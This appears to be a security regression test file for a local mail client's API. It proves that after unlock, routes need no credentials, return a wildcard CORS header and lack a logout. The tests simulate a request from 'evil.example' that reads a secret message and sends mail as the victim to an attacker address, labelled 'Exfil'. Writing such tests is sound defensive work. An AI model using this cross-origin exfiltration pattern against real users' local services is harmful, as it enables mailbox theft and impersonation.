/**
 * C1 — No per-request auth after unlock + wildcard CORS + no lock/logout.
 *
 * Once the single process is unlocked, every /api/* data route is reachable by
 * anyone who can send HTTP to the port, with NO token/cookie/session. Combined
 * with Hono's default cors() (Access-Control-Allow-Origin: *), any web page the
 * victim visits can read their entire mailbox and send mail as them from the
 * victim's browser.
 */
import { describe, expect, it, afterAll } from "vitest";
import { createApp } from "../../src/api/server.js";
import { MockSmtpServer } from "../../src/test-helpers/mock-smtp-server.js";
import {
	createTestContext,
	createTestDb,
	createTestIdentity,
	createTestMessage,
	createTestFolder,
	createTestInboundConnector,
} from "../../src/test-helpers/test-db.js";

describe("C1: unauthenticated API access + CORS", () => {
	const mock = new MockSmtpServer();
	afterAll(async () => { await mock.stop(); });

	it("serves mail to any origin with no credentials and reflects CORS wildcard", async () => {
		const db = createTestDb();
		const conn = createTestInboundConnector(db, { imapHost: "127.0.0.1" });
		const folder = createTestFolder(db, conn, "INBOX", { name: "INBOX", specialUse: "\\Inbox" });
		const msgId = createTestMessage(db, conn, folder, 1, {
			subject: "SECRET: wire $50k to acct 123",
			textBody: "top secret body",
		});
		const { app } = createApp(createTestContext(db));

		// A request carrying ONLY an attacker Origin — no Authorization, no Cookie.
		const res = await app.request(`/api/messages/${msgId}`, {
			headers: { Origin: "https://evil.example" },
		});
		expect(res.status).toBe(200);
		const acao = res.headers.get("access-control-allow-origin");
		// Hono's default cors() answers with "*" — browsers will let evil.example
		// read this cross-origin response.
		expect(acao).toBe("*");
		const body = await res.json();
		const text = JSON.stringify(body);
		expect(text).toContain("SECRET: wire $50k");
	});

	it("has no lock/logout endpoint to drop the unlocked state", async () => {
		const db = createTestDb();
		const { app } = createApp(createTestContext(db));
		for (const path of ["/api/lock", "/api/logout", "/api/session"]) {
			const res = await app.request(path, { method: "POST", body: "{}", headers: { "content-type": "application/json" } });
			expect(res.status).toBe(404); // route does not exist
		}
	});

	it("lets an unauthenticated caller send mail AS the user via /api/send", async () => {
		const port = await mock.start();
		mock.reset();
		const db = createTestDb();
		const identityId = createTestIdentity(db, {
			name: "Victim", email: "victim@corp.example",
			smtpHost: "127.0.0.1", smtpPort: port, smtpUser: "victim", smtpPass: "s3cret",
		});
		const { app } = createApp(createTestContext(db));

		const res = await app.request("/api/send", {
			method: "POST",
			headers: { "content-type": "application/json", Origin: "https://evil.example" },
			body: JSON.stringify({
				identity_id: identityId,
				to: ["attacker@evil.example"],
				subject: "Exfil",
				text_body: "sent by an unauthenticated cross-origin caller",
			}),
		});
		expect(res.status).toBe(200);
		expect(mock.messages.length).toBe(1);
		expect(mock.messages[0].from).toContain("victim@corp.example");
		expect(mock.messages[0].to).toContain("attacker@evil.example");
	});
});
